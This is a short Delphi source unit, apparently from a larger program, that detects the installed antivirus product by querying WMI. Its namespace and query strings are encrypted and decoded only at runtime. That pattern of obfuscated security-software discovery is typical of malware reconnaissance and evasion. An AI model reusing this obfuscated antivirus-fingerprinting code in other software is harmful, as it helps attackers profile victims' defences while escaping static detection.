unit uAnt;

interface

uses
 SysUtils, ActiveX, ComObj, Variants, uEnc;

function GetAVP:string;

implementation

function VarArrayToStr(const vArray: variant): string;
  function _VarToStr(const V: variant): string;
  var
    Vt: integer;
  begin
    Vt := VarType(V);
    case Vt of
      varSmallint, varInteger: Result := IntToStr(integer(V));
      varSingle, varDouble, varCurrency: Result := FloatToStr(Double(V));
      varDate: Result := VarToStr(V);
      varOleStr: Result := WideString(V);
      varBoolean: Result := VarToStr(V);
      varVariant: Result := VarToStr(Variant(V));
      varByte: Result := char(byte(V));
      varString: Result := string(V);
      varArray: Result := VarArrayToStr(Variant(V));
    end;
  end;

var
  i: integer;
begin
  Result := '[';
  if (VarType(vArray) and VarArray) = 0 then
    Result := _VarToStr(vArray)
  else
    for i := VarArrayLowBound(vArray, 1) to VarArrayHighBound(vArray, 1) do
      if i = VarArrayLowBound(vArray, 1) then
        Result := Result + _VarToStr(vArray[i])
      else
        Result := Result + '|' + _VarToStr(vArray[i]);

  Result := Result + ']';
end;

function VarStrNull(const V: OleVariant): string;
begin
  Result := '';
  if not VarIsNull(V) then
  begin
    if VarIsArray(V) then
      Result := VarArrayToStr(V)
    else
      Result := VarToStr(V);
  end;
end;

function GetWMIObject(const objectName: string): IDispatch;
var
  chEaten: Integer;
  BindCtx: IBindCtx;
  Moniker: IMoniker;
begin
  OleCheck(CreateBindCtx(0, bindCtx));
  OleCheck(MkParseDisplayName(BindCtx, StringToOleStr(objectName), chEaten, Moniker));
  OleCheck(Moniker.BindToObject(BindCtx, nil, IDispatch, Result));
end;

function GetAVP:string;
var
  objWMIService: OLEVariant;
  colItems: OLEVariant;
  colItem: OLEVariant;
  oEnum: IEnumvariant;
  iValue: LongWord;
begin;
  objWMIService := GetWMIObject(DE('+R/+YbvX0cr1V/gzIlmjnCsSPjUtARo81MfJZPQr9eLv+ZcpsBPx+3E'));
  colItems := objWMIService.ExecQuery(DE('aB9mJBr4B1QeQ5g5a7H+6+vq4iSi8F+Bs8YlAa/V'), 'WQL', 0);
  oEnum := IUnknown(colItems._NewEnum) as IEnumVariant;
  while oEnum.Next(1, colItem, iValue) = 0 do
  begin
    Result := Trim(VarStrNull(colItem.displayName));
  end;
end;

end.

 